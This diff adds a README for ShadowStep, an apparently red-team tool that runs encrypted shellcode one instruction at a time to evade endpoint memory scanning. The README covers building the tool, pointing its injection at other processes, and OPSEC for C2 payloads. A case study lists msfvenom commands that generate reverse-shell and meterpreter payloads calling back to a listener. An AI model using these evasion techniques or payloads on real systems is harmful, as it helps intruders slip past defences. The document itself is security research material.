@@ -1,0 +1,136 @@
+# ShadowStep
+**In-memory Encrypted Shellcode Execution Suite**  
+ShadowStep is a research-oriented tool designed to execute an encrypted shellcode, ensuring that it is **never fully decrypted** in memory. At any given time, only a single instruction is available in plaintext, significantly reducing exposure to traditional memory-scanning techniques.
+
+Many endpoint detection systems rely, among other techniques, on static memory pattern scanning to identify malicious payloads. ShadowStep mitigates this approach by decrypting, executing, and immediately re-encrypting shellcode instructions one at a time.
+
+> ⚠️ This project is intended for research, educational, and defensive security purposes only.
+
+## Key Concept
+
+ShadowStep implements a custom single-step execution engine for encrypted shellcodes.
+Instead of relying on exception handlers or CPU flags, it temporarily swaps the execution context of the host process with a virtual context in which the shellcode is executed instruction-by-instruction.
+At no point does the full shellcode exist in decrypted form in memory.
+
+This implementation focuses on an original approach and on reducing observable execution artifacts:
+- No exception handler (VEH / SEH) registration required
+- No need to configure specific flags
+- More efficient than other single-step methods based on trap flag and exception handlers
+- No suspicious behavior (HW/SW breakpoints, ...) commonly associated with debugging or emulation-based execution
+- To the best of my knowledge, there are no inherent limitations on the opcodes that can be used by the shellcode
+
+You might consider using this project if you have these objectives in mind:  
+- Apply an additional obfuscation layer to otherwise detectable or known payloads
+- Integrate encrypted execution into an already developed custom loader
+- Increase code resistance to static memory analysis
+- Increase the effort required for reverse engineering
+
+
+## Structure
+
+> 🚧 This project is currently under development. Functionalities and documentation may change as the tool evolves.
+
+The solution `ShadowStep` contains two Visual Studio projects:  
+- `ShadowStep.Compiler` used to build `ShadowStep.Compiler.exe`: this binary implements ShadowStep on a given shellcode.
+- `ShadowStep.Runtime` used by `ShadowStep.Compiler.exe` to build your custom executable using ShadowStep.
+
+## Setup
+
+### Setup via VCPKG
+
+Install vcpkg from the Command Line:  
+```cmd
+git clone https://github.com/microsoft/vcpkg.git
+cd vcpkg
+bootstrap-vcpkg.bat
+```
+
+Install Capstone static library:   
+```cmd
+vcpkg install capstone[x86]:x64-windows-static
+```
+
+Add the integration for Visual Studio:  
+```cmd
+vcpkg integrate install
+```
+
+Build the ShadowStep Compiler using MSBuild:  
+```cmd
+git clone git@github.com:jtalamini/shadowstep.git
+msbuild shadowstep\ShadowStep.Compiler\ShadowStep.Compiler.vcxproj /t:Clean,Build /p:Configuration=Release /p:Platform=x64
+```
+
+You might choose to build the project with Visual Studio as well.
+
+### Manual Setup
+
+Clone this repo:  
+```cmd
+git clone git@github.com:jtalamini/shadowstep.git
+```
+
+Download [Capstone](https://github.com/capstone-engine/capstone) and install it somewhere on your machine (e.g., C:\libs\capstone).
+
+Open the solution in Visual Studio and configure the `ShadowStep.Compiler` project to use Capstone.   
+
+**Add Capstone headers**   
+Navigate to:  
+```
+(ShadowStep.Compiler) Project → Properties → C/C++ → General → Additional Include Directories
+```
+add the path to the include folder (e.g., C:\libs\capstone\include).
+
+**Add the library to the linker**  
+Navigate to:  
+```
+(ShadowStep.Compiler) Project → Properties → Linker → General → Additional Library Directories
+```
+add the path to the folder containing capstone.lib (e.g., C:\libs\capstone\lib or C:\libs\capstone\msvc)
+
+**Link the library**  
+Navigate to:  
+```
+(ShadowStep.Compiler) Project → Properties → Linker → Input → Additional Dependencies
+```
+
+add the value `capstone.lib`
+
+Finally, build the `ShadowStep.Compiler` project using Visual Studio.
+
+## Usage
+
+> ⚠️ This project supports only x64 shellcodes as a design choice.
+
+Run the following command:
+```cmd
+.\ShadowStep.Compiler.exe <path-to-your-shellcode> <path-to-the-shadowstep-runtime-project-file>
+```
+The mandatory arguments are:
+- `<path-to-your-shellcode>` is the path of a .bin file which contains your shellcode
+- `<path-to-the-shadowstep-runtime-project-file>` is the full path of the `ShadowStep.Compiler\ShadowStep.Runtime.vcxproj` project file.
+
+This generates a ready-to-use x64 executable file that implements ShadowStep on the given shellcode.
+Since `ShadowStep.Compiler.exe` automatically builds the `ShadowStep.Runtime` project using _msbuild_, the resulting file should be under `ShadowStep.Runtime\x64\`.
+
+## OPSEC
+Detection of the artifacts generated using ShadowStep is _still possible_ for instance when used to obfuscate C2 payloads that rely on spawning new processes in which they write BOFs to execute them.
+
+Since ShadowStep focuses on memory visibility reduction -- and not complete behavioral stealth -- some adjustments to the generated code might be needed for custom usage:
+- The shellcode injection code uses standard Windows API but it can be customized.
+- By default the shellcode is injected into the current process. Feel free to change `hProcess` in order to target a different process.
+- ShadowStep currently supports only XOR and RC4 as encryption methods.
+
+## Case Study
+This suite was tested on the following _msfvenom_ payloads:
+- `msfvenom -p windows/x64/exec CMD="calc.exe" -f raw -o calc.bin`
+- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.3 LPORT=9999 -f raw -o revshell.bin`
+- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.3 LPORT=4444 -f raw -o met.bin`
+
+It was also tested on `Havoc C2` framework, but as already mentioned, since most agents execute BOFs and spawn a new process every time it is not possible to rely on ShadowStep to hide that kind of execution.
+
+## Acknowledgements
+Special thanks to the developers of the **Capstone** library for their excellent work and for providing a powerful and well-designed disassembly framework that made this research possible.
+
+## Licensing
+This project is licensed under the MIT License. See the accompanying [LICENSE](./LICENSE) file for more information.
